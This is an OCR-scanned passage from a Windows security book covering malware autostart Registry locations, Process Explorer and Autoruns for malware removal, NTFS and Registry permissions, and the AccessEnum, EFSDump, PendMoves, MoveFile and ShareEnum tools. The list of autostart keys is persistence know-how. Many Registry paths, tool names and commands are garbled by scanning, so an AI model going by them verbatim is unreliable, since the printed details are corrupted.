CurrentVersion\RunServicesOnce 
HKEY LOCAL MACHINE\Software\Microsoft\Windows\ 
CurrentVersion\Run 
HKEY LOCAL MACHINE\Software\Microsoft\Windows\ 
CurrentVersion\RunOnce 
HKEY LOCAL MACHINE\Software\Microsoft\Windows\ 
CurrentVersion\RunOnceEx 

106 
Chapter 2 9 Examining Your Computer 
HKEY LOCAL MACHINE\Software\Microsoft\WindowsNT\ 
CurrentVersion\Windows 
HKEY LOCAL MACHINE\Software\Microsoft\WindowsNT\ 
CurrentVersion\Winlogon 
HKEY LOCAL MACHINE\Software\Microsoft\WindowsNT\ 
CurrentVersion\Windows\Applnit_DLLs 
HKEY LOCAL MACHINE\Software\Microsoft\Windows\ 
CurrentVersion\Policies\Explorer\lKun 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\ 
CurrentVersion\Explorer\SharedTaskScheduler 
HKEY_C LAS SE S_IKO OT \ c omfile \shell \ open \ command 
HKEY_CLASSES_lKOOT\piffile\shell\open\command 
HKEY_CLAS SE S_RO OT \ exefile \shell \ open \ command 
HKEY_CLASSES_ROOT\txtfile\shell\open\command 
Other Common Malware Startup Locations 
The following two malware autostart locations are listed by clicking the Explorer 
tab in Autoruns: 
Shell Object Delay Load: 
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
ShellServiceObj ectDelayLoad 
Shell Execute Hooks: 
HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Sh 
ellExecuteHooks 
The following two malware autostart locations are listed by clicking the 
lnternet Explorer tab of Autoruns: 
Browser Helper Objects: 
HKLM\Software\Microsoft\Windows\CurrentVersion\ 
Explorer\Browser Helper Objects 
Url Search Hooks: 
HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks 

Examining Your Computer 9 Chapter 2 
107 
Summary 
In this age of rootkits and stealth technology, use of effective system analysis tools is 
essential. The desire for financial gain has literally spawned an epidemic of cyber- 
crime. Malware writers are in it for the money now, and just breaking into a system 
is no longer a hacker's primary objective. Cybercriminals are a highly motivated and 
unscrupulous lot. Because all of us are vulnerable targets for a malware attack, our 
security consciousness has been raised considerably. 
Process Explorer and Autoruns make an excellent adjunct to traditional security 
solutions such as antivirus and antispyware programs. They are not a replacement for 
these programs, but rather, are a complement to help you explore your system for 
signs of malware intrusion. Putting your system under such scrutiny allows you to 
identify and eliminate any resident infections in a timely manner. 
Now that malware has become highly sophisticated, we need tools that enable us 
to investigate suspicious activity and the physical evidence of malware penetration 
thoroughly. Most rootkits achieve their stealth by installing kernel-mode drivers. 
Process Explorer can list all of the drivers and their locations on your system. It gives 
you the ability to verify the digital signatures of these drivers through the Driver 
Properties dialog. By running Process Explorer with AntiHookExec, you even can 
list rootkit drivers. Since they will not be able to pass signature verification, like most 
other drivers, you can identify them more easily. Process Explorer and Autoruns 
together can help you spot and eliminate rootkit autostarts, services, and kernel- 
mode drivers. Even if malware is not rootkit associated, it may launch from a very 
obscure autostart that few programs are capable of seeing. MSConfig is very limited 
when it comes to revealing these hidden autostarts, so you should examine your 
system with Autoruns at regular intervals. 
Process Explorer and Autoruns can also assist in identifying nonessential running 
programs and services that drag your system down for no valid reason. Many newly 
installed programs add an autostart entry to the Registry so that they run automati- 
cally whenever Windows starts. Such programs are not necessarily harmful, but they 
do stake a claim on the system resources pie. When you configure these "resource 
hogs" to start manually, their associated programs will run only when you decide to 
invoke them.You then can reallocate the resources they consumed to other pro- 
grams. Many people with clean systems complain of sluggishness or prolonged 
startup times. Needless background programs or services are often the source of their 
complaints. Autoruns can help you weed out and disable unnecessary startups with a 
resultant improvement in system efficiency. Process Explorer can help you locate and 
stop nonessential running services and programs. 
www.syngress.com 

108 
Chapter 2 9 Examining Your Computer 
This chapter taught you how to use Process Explorer and Autoruns to spot and 
eliminate malware autostarts, services, drivers, and processes. By using Process 
Explorer and Autoruns routinely, you will become more skilled at identifying what is 
a required, nonessential, or potentially unwanted program.You can systematically 
follow the forensic techniques used in the examples and apply them to your own 
system. 
Solutions Fast Track 
Exploring Process Activity with Process Explorer 
H 
Process Explorer enables you to identify nearly everything there is to know 
about a process by examining the Process Properties dialog. From there you 
may access information pertaining to a process's active threads, images, 
running services, security attributes, and strings. 
The hierarchical nature of the process tree visually depicts the parent and 
descendent relationships of every active process. The color highlighting 
indicates whether a process has a service running (lilac), is packed (purple), 
or is entering (green) or exiting (red). The lower pane view shows all DLLs 
loaded by the highlighted process or operating resources open to the 
process (handles). The Find command can help you to identify process- 
resource interdependencies and to determine what might be keeping a 
process "locked." 
The lower pane reveals what DLLs the process highlighted in the upper 
pane has loaded (DLL view), and identifies what handles (operating system 
resources) a process has open. 
By examining the lower pane view when the system process is highlighted 
in the upper pane you can see all kernel-mode drivers installed on your 
system. 
You can access Verify Image Signatures in the Process Properties dialog and 
use them to test processes for authenticity. 
Right-clicking a driver in the lower pane will bring up a Driver Properties 
dialog, which allows you to view the driver's image (location of the file on 
disk) or Google the filename listed in the Image field. 
www.syngress.com 

Examining Your Computer 9 Chapter 2 
109 
Viewing and Controlling 
Process Activity Using Process Explorer 
Vr Process Explorer gives you complete control over execution of processes 
and services.You can stop, suspend, resume, and kill processes from the 
context menu or main menu. 
Vr You can selectively kill process threads from the Properties dialog, and the 
Service tab in the Properties dialog enables you to stop, pause, or resume 
services with a single click. 
17I You can identify modules executed by rund132.exe and svchost.exe by 
clicking the Image or Service tab, respectively, in the Properties dialog. The 
tooltip (which you can view by hovering your cursor over an item) can 
also identify rund132.exe and svchost.exe targets. 
Exploring Program 
Autostart Locations Using Autoruns 
Vr Autoruns displays nearly every known startup location. 
Vr Autoruns groups autostarts into like categories to make them more 
manageable and easier to interpret. 
r-el You can use Verify Code Signatures and Hide Signed Microsoft Entries to 
minimize the displayed items safely, allowing you to hone in on suspicious 
entries. 
17I You can disable autostarts by deleting them or unchecking them for 
temporary deactivation. 
r-el Double-clicking an autostart item transports you to its launch point in the 
Registry or to its startup folder on disk. 

110 
Chapter 2 9 Examining Your Computer 
The Dynamic Duo" Using 
Autoruns and Process Explorer Together to 
Troubleshoot Startups and Combat Malware 
gl You can use Process Explorer and Autoruns together to identify the 
physical evidence of malware penetration: running processes and autostarts. 
gl Malware removal involves both deleting the startup entry in Autoruns and 
stopping malware processes/services in Process Explorer. 
Vr When both Autoruns and Process Explorer are open, right-clicking an 
Autoruns item and selecting Process Explorer will immediately open a 
Process Explorer Properties dialog on the item defined in the Autoruns 
Image column. 
gl Examining Service autostarts in Autoruns can reveal suspect driver 
installations. 
Vr Examining the service in the Process Explorer Properties dialog enables 
you to stop a rogue service and identify the file on disk to be removed. 
Vr You can successfully identify kernel-mode rootkit services, autostarts, and 
drivers by launching Process Explorer and Autoruns through 
AntiHookExec.exe, a rootkit hook restoration program. 
Vr You can use Autoruns to identify and remove autostarts that MSConfig 
does not inspect. 
V-4I Autoruns' File Comparison feature allows you to compare a previous 
Autoruns system snapshot (baseline) with current autostarts so that you can 
investigate any differences. 


112 
Chapter 2 9 Examining Your Computer 
Q: 
A: 
Autoruns may show all autostarts, but all those entries are giving me too much 
information. How can I set it to make it easier to interpret the results? 
If you check Verify Code Signatures and Hide Signed Microsoft Entries 
under Options and then press F5 (screen refresh), you will significantly reduce 
the number of displayed entries.You also can run Autoruns in safe mode. If a 
rnalware program does not run in safe mode, it will not interfere with autostart 
removal. 
Q: 
A: 
How can I tell whether an entry is good or bad? 
Check the file's image. Once you systematically get used to using Process 
Explorer and Autoruns, you will become better able to spot potential problems. 
The research databases can help you identify processes. They are continually 
updated from verified user input.You can also upload any file on your system to 
Virus Total or Jotti for scanning. The right-click ] Google feature always comes 
in very handy, too. 
Q: 
A: 
If I know a bad process is running, will Process Explorer get rid of it when I 
kill it? 
No, killing the process or stopping the service will not delete the responsible 
file.You must always locate the file identified in the Image field on your hard 
drive and manually remove it. However, be very sure the item is malware before 
you take that step. It is also a good idea to remove the autostart in Autoruns if 
there is one attributable to that process. 
Q 
a 
A: 
What are some of the earmarks of a malware process? 
Some malware process indicators are a blank or nonverifiable publisher, a packed 
image, and not knowing why the file is there in the first place. If the process is 
running from a system folder or from a temporary directory such as 
C:\Documents and Settings\<user name>\Local Settings\Temp, rather than 
from a legitimate Program Files folder, that is also a cause for concern. Such 
items merit further investigation. If you can find no information on the process 
by Googling or by searching in the research databases, definitely get a verdict 
from Jotti or Virus Total. 


114 
Chapter 3 9 Checking the Security of Your Computer 
Introduction 
Sometimes your antivirus and antispyware software does not catch everything and 
your computer starts to behave suspiciously, leaving you to believe that someone has 
compromised your computer. Using the standard tools that come with Windows can 
give you only an inkling of what may be happening, and learning more requires a 
more in-depth view of the problem. Additionally, finding information that is a bit 
more detailed or advanced is possible only if you are a system programmer or you 
have access to tools developed by a system programmer. 
This chapter describes, in detail, the tools developed by Sysinternals to illustrate 
this sort of advanced information and explains how to use them.You will learn how 
to determine who has what kind of access to system resources, how to examine 
Encrypting File System (EFS) encrypted files, and how to verify the validity of sus- 
picious local files.You will also learn how to use the available Winternals tools to 
move an unmovable file and to list files that are already marked to be moved. Finally, 
you will discover a simple way to check for rootkits on your system. 
Viewing the Security Settings 
of Your Resources (AccessEnum) 
The notion of file- and folder-level security has been a part of the Windows oper- 
ating system since its earliest days. In previous versions of the Windows operating 
system, Microsoft released separate, different versions for consumer and business use. 
Windows 95 and Windows 98 were intuitive and easy for consumers to use, but they 
offered no file-level security and only the most basic form of directory-level secu- 
rity. All of this changed with Windows 2000 and Windows XP, both of which pro- 
vide a friendly graphical user interface (GUI) while offering security features not 
afforded by Windows 95 and Windows 98. 
Understanding File and Directory Access Rights 
One of the chief security features that you can implement for both server and work- 
station computers is the ability to use the NT file system (NTFS), which allows you 
to create access control lists (ACLs) on files and directories. These ACLs will control 
who can access or modify a file or folder, even when the user is at the local com- 
puter console. (Windows 95 and Windows 98 supported only share-level security, 
which controlled access to files and folders from across a network but did nothing to 
restrict local access to those files.) Each file and folder on an NTFS-formatted hard 
drive possesses an ACL to determine who can and cannot access a particular 
resource. 
www.syngress.com 

Checking the Security of Your Computer 9 Chapter 3 
115 
Configuring Access Control Lists 
ACLs are composed of one or more access control entries (ACEs), each containing 
the following information: 
9 
The user, group, or computer object to which the ACE applies 
9 
Whether this is an Allow ACE or a Deny ACE 
9 
The specific set of permissions that are being allowed or denied 
When you are configuring ACEs to create an ACL, the predefined settings will 
suffice for most security needs. However, you can make more granular security deci- 
sions by using the special permissions that make up the predefined settings. The pre- 
defined security settings that you can assign to a file or folder on an NTFS file 
system are as follows. 
Full Control 
The user who has been assigned this permission can perform any action on the 
folder, including modifying or deleting the folder, as well as taking ownership of the 
folder and modifying the permissions that have been assigned to it. The Full Control 
permission set encompasses the following special permissions: 
9 
Traverse Folder/Execute File 
9 
List Folder/Read Data 
9 
Read Attributes 
9 
Read Extended Attributes 
9 
Create Files/Write Data 
9 
Create Folders/Append Data 
9 
Write Attributes 
www.syngress.com 

116 
Chapter 3 9 Checking the Security of Your Computer 
9 
Write Extended Attributes 
9 
Delete Subfolders and Files 
9 
Delete 
9 
Read Permissions 
9 
Change Permissions 
9 
Take Ownership 
9 
Synchronize 
Modify 
The user or group can modify the folder and its contents, including creating new 
files and subfolders. The user or group cannot take ownership of the folder or 
modify any existing permissions assigned to it. The Modify permission set encom- 
passes the following set of special permissions: 
9 
Traverse Folder/Execute File 
9 
List Folder/Read Data 
9 
Read Attributes 
9 
Read Extended Attributes 
9 
Create Files/Write Data 
9 
Create Folders/Append Data 
9 
Write Attributes 
9 
Write Extended Attributes 
9 
Delete 
9 
Read Permissions 
9 
Synchronize 
Read & Execute 
As the name implies, this allows the user to read files and folders, as well as to run 
any executable files contained within the folders. The user cannot create new files or 
folders or modify any existing information within the folders. The Read & Execute 
permission set encompasses the following special permissions: 

Checking the Security of Your Computer 9 Chapter 3 
117 
9 
Traverse Folder/Execute File 
9 
List Folder/Read Data 
9 
Read Attributes 
9 
Read Extended Attributes 
9 
Read Permissions 
9 
Synchronize 
List Folder Contents 
This permission set grants the same level of access as the Read & Execute permis- 
sion set; the difference between the two exists in how they are inherited.You can 
assign the List Folder Contents permission only to folders; folders can also inherit 
List Folder Contents permission. In contrast, you can allow or deny the Read & 
Execute permission to both files and folders. List Folder Contents is useful if you 
want to allow a group of users to browse the contents of a particular folder, but you 
need to restrict their ability to view or modify some of the files contained within 
that folder. 
Read 
Read confers the same level of access as Read & Execute, except that it does not 
allow you to run any executable files. 
Write 
This permission set allows a user to create and modify files and folders, but not to 
delete them. The Write permission set encompasses the following special 
permissions: 
9 
Create Files/Write Data 
9 
Create Folders/Append Data 
9 
Write Attributes 
9 
Write Extended Attributes 
9 
Read Permissions 
[] 
Synchronize 

118 
Chapter 3 9 Checking the Security of Your Computer 
Configuring Permissions Inheritance 
To reduce the administrative overhead involved in configuring file permissions for 
an entire computer, NTFS permissions allow you to configure permissions inheri- 
tance, whereby you can configure a set of permissions at one point in the file system 
and have those permissions "trickle down" to the files and folders beneath it.You'll 
configure permissions inheritance in two chief ways: 
9 
Folder permissions inherited by files Any files contained within a 
folder will automatically receive the permissions assigned to the folder.You 
do not have to assign permissions to each individual file on a server or 
workstation hard drive. 
9 
Folder permissions inherited by subfolders By default, when you 
assign permissions to a folder at a higher level in the folder hierarchy, all 
files and subfolders beneath it wiU also receive those permissions. So, if you 
grant the Read permission on the C:\FinanceDocs folder to the Finance 
Users group, that permission will propagate down to all existing subfolders 
and files within this top-level folder. 
Because of permissions inheritance, and because you can use group objects as 
well as users to configure ACEs, you may run into a situation where a single user has 
more than one ACE in the ACL that applies to him. When Windows evaluates the 
ACL on a file or folder, it applies permissions using the following priorities: 
9 
Inherited Allow The first permissions Windows that will apply are the 
Allow ACE entries that a file has inherited from its parent folder or from a 
higher-level folder in the file structure. So, if a user is trying to access a file 
in the C:\FinanceDocs\SalesDocs\January folder and he or she has been 
allowed Read permission to C:\FinanceDocs, this Inherited Allow will be 
processed first. 
9 
Inherited Deny The next permissions Windows will apply are the Deny 
ACE entries from farther up in the file system. If an Inherited Deny con- 
flicts with an Inherited Allow, the Inherited Deny will take precedence. In 
the preceding example, if the user has been allowed Read permission to 
C:\FinanceDocs but has been denied Read permission to 
C:\FinanceDocs\SalesDocs, his attempt to access a file in the 
C:\FinanceDocs\SalesDocs\January folder will be denied. In other words, 
an Inherited Deny ACE will override an Inherited Allow ACE. 

Checking the Security of Your Computer 9 Chapter 3 
119 
9 
Explicit Allow An Explicit Allow is an ACE that has been applied directly 
to the file or folder that the user is attempting to access; this explicit ACE 
will override any ACEs that have been inherited from farther up the file 
system, regardless of whether the inherited ACE is an Inherited Allow or an 
Inherited Deny. So if the user in our example has been explicitly granted 
permission to access the JanuarySales.xls folder in 
C:\FinanceDocs\SalesDocs\January\JanuarySales.xls, he or she will be able 
to open the file. This is often a point of confusion for administrators who 
incorrectly assume that a Deny ACE will override everything. As you can 
see, an Explicit Allow will actually override an Inherited Deny. 
[] 
Explicit Deny As the name suggests, this is a Deny ACE that has been 
applied directly to the file or folder that the user is attempting to access. An 
Explicit Deny ACE will override all other permissions that have been 
allowed, whether explicitly or through inheritance. 
So what happens if, even after all of this, a user still has more than one ACE of 
the same priority for the same file or folder? For example, say you have allowed 
Read permission on C-\FinanceDocs to the Finance Users group, but you've also 
allowed Modify permission to John Smith's individual user account. Can John only 
read the file? Or can he modify it as well? In a case where you've allowed different 
permissions on the same object to the same user, the user will receive the least 
restrictive set of permissions. In the example we just laid out, John Smith will be 
able to modify files and folders within the C:\FinanceDocs directory. 

120 
Chapter 3 9 Checking the Security of Your Computer 
Understanding Registry Access Rights 
The Windows Registry is a configuration database that's stored locally on every 
Windows client and server running Windows 95/98/ME, Windows 2000 Server and 
Professional, Windows XP Home and Professional, and Windows Server 2003. The 
Registry contains sensitive system information that you need to protect just as strin- 
gently as any file or folder on the hard drive. In most cases, you will not modify the 
Registry directly; rather, you'll make changes through the Windows GUI or at the 
command line, and the Windows operating system will update the appropriate 
Registry entry behind the scenes. The Registry itself is organized into trees that 
consist of numerous keys that contain one or more values. These subfolders and the 
keys contained within them dictate the configuration and behavior of a Windows- 
based computer. The Registry actually contains only two trees: HKEY_LOCAL_ 
MACHINE and HKEY_USERS. However, when you open the Windows Registry 
Editor, as shown in Figure 3.1, you can see that five top-level folders are visible. This 
is because three of the five are simply shortcuts or references to locations within the 
two physical trees. 
Figure 3.1 The Windows Registry Editor 
The five trees listed in the Registry Editor correspond to the following Registry 
trees and shortcuts" 
HKEY_CLASSES_ROOT This key contains information used by soft- 
ware that relies on object linking and embedding (OLE). 
HKEY_CLASSES_ROOT also contains information about associations 
between files and classes. A key will be created in this tree if there's a corre- 
sponding value in HKEY_LOCAL_MACHINE\SOFTWARE\Classes or 
HKEY_CURRENT_USER\SOFTWARE\Classes. (If the same value 
exists in both places, the value in HKEY_CLASSES_ROOT will be the 
one from the HKEY_CURRENT_USER tree.) 

Checking the Security of Your Computer 9 Chapter 3 
121 
9 
HKEY_CURRENT_USER 
This key contains user profile information 
for the user who currently is logged on interactively. It contains environ- 
ment variables such as desktop settings, network and printer mappings, and 
program preferences. This key is an alias to the user's subkey within the 
HKEY_USERS tree, which contains information about all actively loaded 
user profiles as well as the default user profile. 
9 
HKEY_LOCAL_MACHINE 
This key contains information about the 
local computer, including hardware configurations such as device driver 
information and operating system data such as system service information. 
9 
HKEY_USERS This tree contains information about all actively loaded 
user profiles, as well as the default user profile. A user will have a subkey in 
this tree only if he is logged on to the computer interactively; if he's 
accessing the computer remotely, he'll have an entry in the HKEY_USERS 
tree of the computer that he's actually logged on to interactively. 
9 
HKEY_CURRENT_CONFIG 
This key is an alias of 
H KEY_L O CAL_MAC HINE \ SY STEM \ C urrentC o ntrolS et \Hardware 
Profiles\Current, and it contains information about the hardware profile 
that the local computer used. The information in this tree configures set- 
tings such as device drivers and the display resolution on your monitor. 
You can secure the Windows Registry in much the same way that you would 
secure a file system using ACLs. Unlike file system ACLs, though, you can set 
Registry permissions only on container objects in the Registry; all keys within a 
container will inherit the permissions that you've assigned to that container.You'll 
typically use two predefined security settings to assign Registry permissions" Read 
and Full Control. Just like file and folder permissions, each of these predefined set- 
tings encompasses a number of special permissions. The Full Control permission, for 
example, includes the following special permissions" 
9 
Query Value Allows the user to read the value of a particular Registry 
key. 
9 
Set Value Allows the user to modify a Registry key value. 
9 
Create Subkey Allows the user to create new Registry subkeys. 
9 
Enumerate Subkey Allows the user to view a list of the subkeys that are 
present underneath a particular parent key. 
9 
Notify Allows the user to request notification whenever a key or subkey is 
changed. 

122 
Chapter 3 9 Checking the Security of Your Computer 
9 
Create Link Allows the operating system to create a symbolic link to a 
particular subkey. 
9 
Deleted Allows the user to delete a Registry key. 
9 
Write DACL Allows the user to modify the permissions on a Registry 
key. 
9 
Write Owner Allows the user to modify the owner of a container or 
subkey. 
9 
Read Control Allows the user to view the auditing information on a 
Registry subkey. 
The Read permission includes a smaller set of permissions: Query Value, 
Enumerate Subkey, Notify, and Read Control. By default, only the built-in 
Administrators group has Full Access permissions to the Registry. Individual users 
have access to only the portion of the Registry that corresponds to their account; 
they cannot modify or even access another user's Registry subkeys. 
Using AccessEnum and Interpreting Its Results 
You can use the Sysinternals AccessEnum tool to verify the permissions that have 
been assigned to a file, a folder and its contents, or a Registry key or subkey. Using 
this information, you can use tools such as Windows Explorer or the xcacls.exe 
command-line tool to modify or correct any invalid or insecure permission assign- 
ments you find. As with the other tools discussed in this book, AccessEnum is a free 
download from www.sysinternals.com. 
To run AccessEnum, simply download the .zip file, extract it to your hard drive, 
and double-click on the AccessEnum.exe executable file; you do not have to worry 
about an installation routine. When you run AccessEnum, you'll see the screen 
shown in Figure 3.2. 

Checking the Security of Your Computer 9 Chapter 3 
123 
Figure 3.2 The AccessEnum Opening Screen 
Click Scan and AccessEnum will search the C:\Windows directory and all of its 
subdirectories, and then display its output in the bottom window. By default, 
AccessEnum will display the following files and folders: 
Directories whose permissions are different from those of their parent 
folder 
Files that have less restrictive permissions than the folder in which they're 
contained 
To select a different directory to examine, click on the Directory button, 
browse to the folder that you wish to scan, and then click OK. To scan a particular 
Registry key, click on the Registry button, browse to the appropriate Registry 
subkey, and then click OK. Once you've selected your target, click on Scan to begin 
scanning the directory or Registry subkey.You'll see output similar to that shown in 
Figure 3.3. 
www.syngress.com 

124 
Chapter 3 9 Checking the Security of Your Computer 
Figure 3.3 Viewing the Output of AccessEnum 
To modify how AccessEnum displays differences in file permissions, click on the 
Options menu. Click on File display options and select one of the following 
options: 
9 
Display only files that have permissions less restrictive than parent (default). 
9 
Display files with permissions that differ from parent. 
To configure AccessEnum to include the Windows LocalSystem account when it 
scans for permission entries, click on the Options menu and then select Show 
LocalSystem account. 
When you are interpreting the output of the AccessEnum utility, it's important 
to keep a few caveats in mind. For instance, AccessEnum's output does not corre- 
spond directly to the permission sets or the special permissions involved in a 
Windows ACL. Instead, AccessEnum will simplify the Windows permissions model 
to display only Read, Write, and Deny permissions. So if a user has been granted 
Write, Modify, Delete, or Full Control permission in a Windows ACL, AccessEnum 
will display this only as a Write permission; if you need to differentiate permissions 
more granularly than that, AccessEnum might not be the tool to use. In addition, 
AccessEnum will not display redundant ACL information. This means that if the user 
jsmith has been individually granted access to a folder, and jsmith is a member of the 
Finance Users group that has been granted the same access to the same folder, 
AccessEnum will display the permissions entry for only the Finance Users group. 

Checking the Security of Your Computer 9 Chapter 3 
125 
Comparing Permissions over Time 
One of the most useful features of AccessEnum is that it enables you to save the 
results of your file/folder security analysis to a tab-delimited text file.You can then 
open this file in another program, such as Microsoft Excel, to analyze the results. In 
addition, you can use AccessEnum to compare the report against the same files and 
folders later, to see whether anything has changed; this is particularly useful during 
troubleshooting, and when determining whether an installed program or a virus or 
rootkit has modified any file or folder permissions. To save the results of an 
AccessEnum scan simply perform the scan and then click the Save button. The scan 
results will appear similar to the output shown in Code Listing 3.1. 
Code Listing 3.1 Viewing the Output of a Saved AccessEnum Report 
"Path" "Read" 
"Write" "Deny" 
"C:\Documents and Settings" 
"Everyone" 
"Administrators" 
"" 
"C : \Documents and Settings\Administrator" 
"Administrators" 
"Administrators" 
II II 
"C : \Documents and Settings\Administrator\Local 
Sett ings \Temp\hsperfdata_Administ rator .... Everyone .... ITS-HUNTER- 
LT\Administrator ..... ' 
"C:\Documents and Settings\All Users" "Everyone" 
"Administrators, 
Power 
Users" "" 
"C:\Documents and Settings\All Users\Application 
Data .... Everyone" 
"Everyone" 
" " 
By saving this report as a baseline, you can run additional scans after installing 
new applications or as a regular practice. AccessEnum will allow you to compare the 
results of two security scans to see where they differ. To see this process in action, 
follow these steps: 
. 
Perform a scan of a directory, such as C'\Documents and Settings, on your 
hard drive. 
. 
. 
Click Save to save a copy of the report as a file named before.txt. 
Make a change to the security settings of this directory, such as granting the 
Users group Full Control of the C:\Documents and Settings\Administrator 
folder. 
. 
Rerun the AccessEnum scan. When it has completed, click File I 
Compare to Saved 
www.syngress.com 

126 
Chapter 3 9 Checking the Security of Your Computer 
. 
Browse to the before.txt file and click Open.You will see the screen shown 
in Figure 3.4. In particular, note the first two lines of the comparison 
report that indicate that the Users group has gained both Read and Write 
access to the C:\Documents and Settings\Administrator folder. 
Figure 3.4 Viewing a Comparison of Two AccessEnum Scans 
Listing the Users with 
Access to Encrypted Files (EFSDump) 
Starting with Windows 2000, Microsoft offered users the ability to encrypt files on 
workstation and server hard drives to provide an additional layer of security beyond 
standard NTFS permissions. With EFS, even if an unauthorized user is able to gain 
physical access to an encrypted file, he will not actually be able to read the contents 
of the file. (Either he will receive an Access Denied message, or the contents of the 
file will be gibberish.) Once a user has encrypted a file or folder, the process 
becomes largely transparent. An authorized user does not need to take any additional 
steps to decrypt a file before opening it; he can double-click on the file or select 
File ] Open in the appropriate application, just as he could before the file had any 
encryption enabled. 
Similar to setting file and folder permissions, it is a best practice to leverage inheri- 
tance when enabling encryption for your files and folders. Instead of encrypting indi- 
vidual files, it is better to encrypt an entire folder so that any files created or copied 
into the folder will be encrypted automatically.You should also configure one or more 

Checking the Security of Your Computer 9 Chapter 3 
127 
Data Recovery Agents (DRAs) who can gain access to an encrypted file if the user who 
originally encrypted the file leaves the company or is otherwise unavailable. 
Running EFSDump and Interpreting Its Results 
EFSDump is another free Sysinternals utility that will display who has access to one 
or more encrypted files or folders. Unlike AccessEnum, this tool is a command-line 
utility that takes the syntax shown in the following example: 
efsdump [-s] -[q] <file/directory path> 
The-s switch instructs EFSDump to recurse through subdirectories if you've 
specified a directory to scan. The-q switch will force EFSDump to run in "quiet 
mode," during which it will not display errors while it's running.You can also use 
wildcards when specifying filenames for EFSDump to analyze, such as the following 
example: 
efsdump -s c:\*.xls. 
When you run EFSDump, it will query all of the files that you specify in order 
to determine who has access to them. If it locates a file that meets the scanning cri- 
teria you've set up, and that file is not encrypted, EFSDump will produce an error 
similar to that shown in Code Listing 3.2. 
Code Listing 3.2 Viewing a Common EFSDump Error Message 
C: \Documents and Settings\lhunter\Desktop\EfsDump\RELEASE>efsdump 
-s 
c:\*.xls 
EFS Information Dumper vi.02 
Copyright (C) 1999 Mark Russinovich 
Systems Internals - http://www.sysinternals.com 
www.syngress.com 

128 
Chapter 3 9 Checking the Security of Your Computer 
Error querying c:\Documents and Settings\Administrator\Templates\excel.xls: 
File is not encrypted 
When EFSDump encounters an encrypted file that meets your criteria, it will 
show you the following information: 
9 
Data Decryption Field (DDF) entries This lists the users who are 
authorized to decrypt an encrypted file. 
9 
Data Recover Field (DRF) entries This lists the users who are config- 
ured as Data Recovery Agents for an encrypted file. 
Code Listing 3.3 is an example of typical EFSDump output. 
Code Listing 3.3 Viewing the Output of EFSDump 
C: \EfsDump\RELEASE>efsdump -s -q c: \* .xls 
EFS Information Dumper vl. 02 
Copyright (C) 1999 Mark Russinovich 
Systems Internals - http://www.sysinternals.com 
c:\Departments.xls: 
DDF Entry: 
DOMAIN\lhunter: 
lhunter(lhunter@DOMAIN) 
DRF Entry: 
Administrator: 
Administrator 
Moving/Deleting Files in 
Use on Reboot (PendMoves, MoveFile) 
Certain files in the Windows operating system, most notably system files and files 
that running services or applications use, are difficult to update because they are 
almost constantly in use by the operating system, service, or application. In order to 
update or modify these files, such as during a service pack or hotfix installation, the 

Checking the Security of Your Computer 9 Chapter 3 
129 
developer will use a Windows application program interface (API) called MoveFileEx 
that allows him to mark the file for update or deletion the next time the computer 
boots up. MoveFileEx creates a queue of files that need to be modified or removed 
in this manner, and applies all changes in the queue the next time the system 
reboots. (This is why you commonly see the message "The system must restart" after 
you've installed an application.) Windows stores the list of files that need to be 
modified in the KEY_LOCAL_MACHINE\System\CurrentControlSet\ 
Control\Session Manager\PendingFileRenameOperations Registry key. 
Running PendMoves 
To view a list of these pending operations, you can either manually drill down to the 
PendingFilelLenameOperations Registry key, or use Sysinternals' free PendMoves 
utility.You may want to see this list as part of a system audit, or to create a report of 
files and folders that have changed during a particular application installation. 
PendMoves will also generate an error if one of the files in the queue is unavailable. 
PendMoves is a command-line utility that does not have any optional or required 
command-line switches; simply enter the command by itself at the command line to 
see the list of files that will be modified or deleted on the next reboot. Code Listing 
3.4 shows a system file that will be updated on the system's next reboot, as well as a 
file that is scheduled for deletion. 
Code Listing 3.4 Viewing the Queue of Files to Be Modified on Reboot 
C : \ >pendmovesPendMove vl. 02 
Copyright 
(C) 2004 Mark Russinovich 
Sysinternals - wwww.sysinternals.com 
Source: C:\WINDOWS\system32\px.dl~ 
Target: C:\WINDOWS\system32\px.dll 
Source: C:\Program Files\Yahoo! \Yahoo! Music Engine\px.dll 
Target : DELETE 
www.syngress.com 

130 
Chapter 3 9 Checking the Security of Your Computer 
Running MoveFile 
To include your own files in the list that will be modified or deleted on reboot, you 
can use the freeware MoveFile utility.You can use this as part of an installation script 
for an application that you've developed in-house, or as part of troubleshooting 
efforts to remove a stubborn file that may have been created by a virus, worm, or 
piece of spyware. MoveFile takes the syntax shown in the following example: 
usage: movefile [source] 
[dest] 
To move a file, you need to specify both a source and a destination location for 
the file in question. To delete a file using MoveFile, specify an empty string ("") as 
the file destination. In the following example, the code will cause Windows to 
reboot C:\badfile.exe the next time the system boots up: 
Movefile C: \badfile .... 
www.syngress.com 

Checking the Security of Your Computer 9 Chapter 3 
131 
Viewing Shared Resources and 
Their Access Permissions (ShareEnum) 
Another aspect of Windows file security is share permissions. File-sharing tech- 
nology, which has been available since Windows 95, allows you to enable network 
users to access files stored on another computer's hard drive without resorting to 
"sneakernet." Even operating systems that do not support local NTFS file and folder 
permissions (such as Windows 95 and Windows 98) support file sharing and allow 
you to set share permissions to control who can access resources over the network. 
Security for file shares is far less granular than NTFS permissions; you can enable 
only the following four permissions: 
9 
Full Control 
9 
Change 
9 
Read 
9 
No Access 
Because these are share permissions, they are applied only when a user is 
accessing a file or folder via a network share; they do not take effect if a user is 
accessing the file locally. For example, let's say you have the C:\FinanceDocs folder 
on the COMPUTER1 workstation shared as \\COMPUTERl\FinanceDocs, and 
you grant the Finance Users group the Read share permission. If users in the 
Finance Users group access the \\COMPUTERl\FinanceDocs share from their 
local hard drives, they will receive the share permissions that have been granted to 
the Finance Users group. However, if those same users were to log on locally to 
COMPUTER.1 and browse to C:\FinanceDocs through Windows Explorer, the 
share permissions configured for \\COMPUTER1 \FinanceDocs would never even 
come into play; the users would receive only the NTFS permissions assigned to the 
folder. 
So what happens if users' NTFS permissions are different from their share per- 
missions? Recall from the AccessEnum section that if users have two different NTFS 
permissions for a particular resource, they will receive the least restrictive permission 
that they have been assigned. If user jsmith has been assigned the Read NTFS per- 
mission through one group membership and the Change NTFS permission through 
a second group membership, the user will have Change permission to the file or 
folder in question. When you combine share permissions with NTFS permissions, 
the opposite happens: if a Share permission is different from the NTFS permission 
on the same resource, the user will receive the more restrictive permission of the two. 
www.syngress.com 

132 
